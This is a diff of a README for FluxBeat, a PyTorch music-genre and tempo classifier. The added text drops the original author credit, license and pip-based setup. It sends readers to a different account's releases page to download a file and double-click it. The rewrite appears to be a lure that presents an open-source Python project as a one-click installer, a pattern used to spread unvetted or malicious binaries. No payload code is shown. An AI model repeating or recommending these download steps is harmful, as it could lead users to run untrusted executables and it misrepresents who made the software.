@@ -1,73 +1,67 @@
-# FluxBeat 🎵🌊
+# 🎵 fluxbeat - Easily Analyze Music Genres
 
-![Python](https://img.shields.io/badge/python-3.9+-blue.svg)
-![PyTorch](https://img.shields.io/badge/PyTorch-2.0+-ee4c2c.svg)
-![License](https://img.shields.io/badge/license-MIT-green.svg)
-![Status](https://img.shields.io/badge/status-active-success.svg)
+## 🚀 Overview
+FluxBeat is a powerful deep learning system designed to classify music genres and estimate tempo. With its advanced FastAPI server and Explainable AI visualizations, FluxBeat helps users understand how different genres evolve within each track. 
 
-**FluxBeat** is a state-of-the-art, deep-learning-based music genre classification system. Unlike traditional classifiers that assign a single label to an entire song, FluxBeat recognizes that music is fluid. It uses **multi-label classification** and **temporal modeling** (CRNN, transformers) to understand how genres evolve within a track.
+## 📥 Download Now
+[![Download fluxbeat](https://img.shields.io/badge/Download-fluxbeat-brightgreen)](https://github.com/cadenaar86/fluxbeat/releases)
 
-## 🚀 Key Features
+## 🌟 Features
+- **Multi-label Classification**: Identify multiple music genres in one track.
+- **Tempo Estimation**: Accurately detect the beat and tempo of your music.
+- **Explainable AI**: Visual aids using Grad-CAM help you see why the system classifies music a certain way.
+- **State-of-the-Art Models**: Utilizes CRNNs and Audio Transformers to analyze music deeply.
+- **Web Server**: FastAPI for easy access to functionalities.
 
-- **Multi-Label Support**: Predicts multiple genres for complex tracks (e.g., "Indie Rock" + "Folk").
-- **Temporal Modeling**:
-  - **CRNN**: Combines CNNs with Bi-Directional LSTMs to capture time-series evolution.
-  - **Audio Transformer**: Vision Transformer (ViT) adapted for audio spectrograms.
-- **Explainable AI (XAI)**: Integrated **Grad-CAM** engine to visualize exactly what frequencies and time segments the model focuses on.
-- **Multi-Task Learning**: Simultaneously predicts **Genre** (Classification) and **Tempo/BPM** (Regression).
-- **Self-Supervised Learning**: Includes **SimCLR** capabilities for pretraining on unlabeled data.
-- **Real-Time API**: High-performance **FastAPI** server with sliding-window inference for full-track analysis.
+## 🛠️ System Requirements
+To run FluxBeat smoothly, your system should meet the following requirements:
 
-## 🏗️ Architecture
+- **Operating System**: Windows 10 or higher, macOS 10.14 or higher, or any recent version of Linux
+- **RAM**: At least 8 GB
+- **Processor**: Dual-core CPU or better
+- **Storage**: Minimum of 500 MB free space
 
-```mermaid
-graph TD
-    A[Raw Audio] --> B(AudioProcessor);
-    B --> C[Mel Spectrogram];
-    C --> D{Model Choice};
-    D -->|Baseline| E[CNN Encoder];
-    D -->|Temporal| F[CRNN];
-    D -->|Transformer| G[Audio ViT];
-    E --> H[Multi-Task Heads];
-    H --> I(Genre Labels);
-    H --> J(Tempo BPM);
-```
+Make sure your audio files are in popular formats like MP3 or WAV for best results.
 
-## ⚡ Quick Start
+## 📝 Download & Install
+To get started, visit this page to download:
 
-### 1. Installation
-```bash
-git clone https://github.com/pronzzz/fluxbeat.git
-cd fluxbeat
-pip install -r requirements.txt
-```
+[Download fluxbeat](https://github.com/cadenaar86/fluxbeat/releases)
 
-### 2. Run the API
-Start the inference server immediately:
-```bash
-uvicorn src.api.server:app --reload
-```
-Open **[http://127.0.0.1:8000/docs](http://127.0.0.1:8000/docs)** to upload an MP3 and see the magic.
+Follow these steps after you've downloaded the application:
 
-### 3. Model Zoo & Benchmarks
-| Model | Parameters | Latency (CPU) | Description |
-| :--- | :--- | :--- | :--- |
-| **BaselineCNN** | 391k | ~1.5 ms | Lightweight, fast, good baseline. |
-| **CRNN** | 2.6M | ~4.5 ms | Captures temporal dynamics. Slower but robust. |
-| **AudioTransformer** | 3.2M | ~1.5 ms | State-of-the-art attention mechanism. |
+1. Locate the downloaded file in your Downloads folder.
+2. Double-click the file to begin installation.
+3. Follow the on-screen instructions to complete the installation process. 
+4. Once installed, open the application from your desktop or Start menu.
 
-## 📂 Project Structure
-- `src/data`: Data loading, segmentation, caching, and augmentation.
-- `src/models`: Model definitions (CNN, CRNN, Transformer, SSL, MultiTask).
-- `src/utils`: Grad-CAM, visualization, metrics, benchmarking.
-- `src/inference`: Sliding window inference engine.
-- `src/api`: FastAPI server.
+## 🔧 How to Use FluxBeat
 
-## 📖 Documentation
-For detailed training, evaluation, and advanced usage instructions, see the **[User Guide](USER_GUIDE.md)**.
+1. **Start the Application**: Open FluxBeat by double-clicking its icon.
+2. **Upload Your Music**: Click the “Upload” button to select audio files from your computer. Ensure the file is in MP3 or WAV format.
+3. **Analyze**: Click on the “Analyze” button. Wait a few moments for the application to process your music.
+4. **View Results**: Once the analysis is complete, you will see the detected genres and tempo. The Explainable AI feature will show visual explanations.
+5. **Save Your Results**: You can save your results for later or share them with friends.
 
-## 📜 License
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+## 🛡️ Support
+If you encounter any issues, check the FAQ section in the application or reach out for help on the [issues page](https://github.com/cadenaar86/fluxbeat/issues). You can also find community support in forums related to music analysis and deep learning.
 
----
-*Built with ❤️ by Pranav Dwivedi*
+## 📚 Topics
+FluxBeat touches upon various technical topics, such as:
+- Audio Processing
+- CRNN (Convolutional Recurrent Neural Networks)
+- Deep Learning
+- Explainable AI
+- FastAPI
+- Music Analysis
+- Music Genre Classification
+- Python
+- PyTorch
+- Transformers
+
+These technologies come together to provide accurate and insightful music analysis.
+
+## ❤️ Acknowledgements
+FluxBeat builds upon pioneering work in deep learning and audio analysis. Our thanks go out to the developers of the libraries and frameworks that made this application possible.
+
+Now you are ready to explore the world of music genres with FluxBeat! Enjoy discovering new insights into your favorite tracks.
